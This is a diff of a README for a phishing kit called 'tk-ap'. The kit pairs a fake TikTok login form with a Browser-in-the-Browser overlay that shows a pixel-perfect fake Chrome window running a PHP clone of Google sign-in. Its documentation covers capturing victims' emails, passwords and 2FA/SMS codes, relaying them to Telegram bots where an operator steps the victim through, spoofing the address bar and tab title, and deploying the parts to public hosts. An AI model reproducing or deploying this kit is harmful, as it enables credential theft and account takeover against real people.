@@ -1,8 +1,10 @@
 # tk-ap
 
-A two-component stack: a static frontend (`fe`) and a PHP credential-collection app (`googlephish`), glued together by a Node.js Express backend (`be`) that handles Telegram-gated approval.
+A static frontend (`fe`), a PHP credential-collection app (`googlephish`), and a Node.js Express backend (`be`) for Telegram-gated approval.
 
-When a visitor clicks "Sign in with Google", a Browser-in-the-Browser (BITB) overlay opens — a pixel-perfect fake Chrome window loading `googlephish` in an iframe. The PHP app walks the victim through Google's email → password → 2FA pages, sending everything to a Telegram bot in real time. A second Telegram bot (Bot A, run by `be`) handles approval and 2FA-challenge decisions for the TikTok login form.
+**Email / phone + password (TikTok form)** — `POST` to `be`, poll until approved or rejected; optional 2FA round. No PHP involved.
+
+**Sign in with Google** — a Browser-in-the-Browser (BITB) overlay loads `googlephish` in an iframe. The PHP flow sends captures to Telegram Bot B.
 
 ---
 
@@ -11,11 +13,13 @@ When a visitor clicks "Sign in with Google", a Browser-in-the-Browser (BITB) ove
 ```
 Browser (fe)
   │
-  └── BITB overlay (iframe) ──→ googlephish (PHP on :8080 / Docker :80)
-                                     └── Telegram Bot B  ←  operator drives victim
+  ├── POST /login + poll ───────→ be (Node) ──→ Telegram Bot A
+  │
+  └── BITB overlay (iframe) ────→ googlephish (PHP)
+                                      └── Telegram Bot B
 ```
 
-The Node backend (`be`) is an **optional** companion used if you also want to gate the TikTok password-login form via Telegram. If you only need the BITB Google phish, `be` is not required.
+Run **`be`** whenever you use the TikTok email/password form. **`googlephish`** is only required for the Google button (BITB).
 
 - **`fe/`** — Plain HTML/CSS/JS. No build step. Served statically.
 - **`googlephish/`** — PHP pages cloning Google sign-in UI. Captures email, password, and OTP/SMS codes and pushes them to Telegram Bot B. The operator drives the victim step-by-step via Telegram inline buttons.
@@ -75,28 +79,29 @@ Edit `fe/config.js`:
 
 ```js
 window.APP_CONFIG = {
-    afterLoginRedirectUrl: 'https://www.google.com', // where to send the victim after "approval"
+    apiBaseUrl: 'http://localhost:4000',
+    authPollIntervalMs: 1500,
+    authPollMaxMs: 3 * 60 * 1000,
+
+    afterLoginRedirectUrl: 'https://www.google.com',
     afterLoginRedirectDelayMs: 0,
 
-    googlephishBaseUrl: 'http://localhost:8080', // URL of the running PHP app (no trailing slash)
+    googlephishBaseUrl: 'http://localhost:8080',
 
-    bitbEntryPath: '/index.php',    // first page loaded inside the BITB iframe
-
-    // What appears in the fake Chrome address bar
+    bitbEntryPath: '/index.php',
     bitbDisplayUrl: 'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin',
-
     bitbTabTitle:   'Sign in - Google Accounts',
     bitbFaviconUrl: 'https://www.google.com/favicon.ico',
-
-    bitbLabLabel: ''  // optional banner text in the fake title bar; leave empty to hide
+    bitbLabLabel: ''
 };
 ```
 
-The frontend has **no Google SDK, no OAuth client ID, and no API calls**. The only thing `googleSignInBtn` does is open the BITB overlay.
+- **`apiBaseUrl`** — Node `be` origin (no trailing slash). Used only for **Log in** (email/phone + password).
+- **`googlephishBaseUrl`** — PHP app origin. Used only for **Sign in with Google** (BITB iframe). There is no Google SDK or OAuth client ID in the frontend.
 
-### 4 — (Optional) Configure the Node backend
+### 4 — Configure the Node backend
 
-Only needed if you want Telegram-gated approval for the TikTok password-login form.
+Required for the TikTok **Log in** (password) flow.
 
 ```bash
 cp be/.env.example be/.env
@@ -158,9 +163,9 @@ python3 -m http.server 3000 --directory fe
 npx serve fe -l 3000
 ```
 
-Open `http://localhost:3000`. The BITB overlay will load `googlephishBaseUrl` in the iframe when the visitor clicks "Sign in with Google".
+Open `http://localhost:3000`. **Log in** talks to `apiBaseUrl` (`be`). **Sign in with Google** opens BITB using `googlephishBaseUrl`.
 
-### Node backend (`be`) — optional
+### Node backend (`be`)
 
 ```bash
 cd be
@@ -231,14 +236,17 @@ Bot B is auto-configured. The PHP app calls `setWebhook` pointing at `<website_u
 
 | Key | Required | Description |
 |-----|----------|-------------|
-| `googlephishBaseUrl` | **Yes** | Public URL of the running PHP app (no trailing slash) |
-| `bitbEntryPath` | No | First PHP page loaded in the BITB iframe (default `/index.php`) |
+| `apiBaseUrl` | For password login | Node `be` origin, no trailing slash (`POST /login`, poll `/login-status`) |
+| `authPollIntervalMs` | No | Milliseconds between status polls (default `1500`) |
+| `authPollMaxMs` | No | Max time to poll before timeout (default `3` minutes) |
+| `googlephishBaseUrl` | For Google button | Public URL of the PHP app (no trailing slash); BITB iframe only |
+| `bitbEntryPath` | No | First PHP page in the BITB iframe (default `/index.php`) |
 | `bitbDisplayUrl` | No | URL shown in the fake Chrome address bar |
 | `bitbTabTitle` | No | Text of the fake Chrome tab |
-| `bitbFaviconUrl` | No | Favicon shown in the fake Chrome tab |
-| `bitbLabLabel` | No | Optional banner text in the fake title bar; empty string hides it |
-| `afterLoginRedirectUrl` | No | Where to redirect the victim after approval (default `https://www.google.com`) |
-| `afterLoginRedirectDelayMs` | No | Delay in ms before redirect (default `0`) |
+| `bitbFaviconUrl` | No | Favicon in the fake Chrome tab |
+| `bitbLabLabel` | No | Optional banner in the fake title bar; empty hides it |
+| `afterLoginRedirectUrl` | No | Browser redirect after Telegram **approval** on password flow |
+| `afterLoginRedirectDelayMs` | No | Delay before redirect (default `0`) |
 
 ### `googlephish/config.json`
 
@@ -300,11 +308,11 @@ Before building, set `website_url` in `config.json` to the final public URL of t
 
 ### fe (frontend)
 
-Serve the `fe/` directory from any static host (Render Static Site, Netlify, Cloudflare Pages, Nginx, etc.). Before deploying, update `googlephishBaseUrl` in `fe/config.js` to point at the deployed PHP app.
+Serve the `fe/` directory from any static host (Render Static Site, Netlify, Cloudflare Pages, Nginx, etc.). Before deploying, set **`apiBaseUrl`** to your deployed Node service and **`googlephishBaseUrl`** to your deployed PHP service (each can be on a different host).
 
-### be (Node backend — optional)
+### be (Node backend)
 
-Deploy as a Node 18 web service. Set all `be/.env` variables as environment variables in your hosting dashboard. After deploying, run the `setWebhook` curl command once.
+Deploy as a Node 18 web service for the password login path. Set all `be/.env` variables in your hosting dashboard. After deploying, run the `setWebhook` curl command once.
 
 ---
 
@@ -312,7 +320,7 @@ Deploy as a Node 18 web service. Set all `be/.env` variables as environment vari
 
 ```
 tk-ap/
-├── be/                          # Node.js Express API (optional)
+├── be/                          # Node.js Express API (TikTok password + Telegram Bot A)
 │   ├── .env.example
 │   ├── package.json
 │   ├── server.js
@@ -328,13 +336,14 @@ tk-ap/
 │           ├── login.js
 │           └── telegram.js      # Webhook handler
 ├── fe/                          # Static frontend
-│   ├── config.js                # All client-side config — edit this before deploying
+│   ├── config.js                # apiBaseUrl (be) + googlephishBaseUrl (BITB)
 │   ├── index.html
 │   ├── main.js
 │   ├── style.css
 │   └── js/
-│       ├── auth-ui.js           # Banner / status UI helpers
-│       └── bitb-googlephish.js  # BITB iframe overlay controller
+│       ├── auth-api.js          # Password login → be (fetch + poll)
+│       ├── auth-ui.js           # Loader, banners, 2FA view, redirect after approval
+│       └── bitb-googlephish.js  # BITB iframe (Google button only)
 └── googlephish/                 # PHP Google sign-in clone
     ├── Dockerfile
     ├── config.json              # Bot B token + operator chat ID + website_url
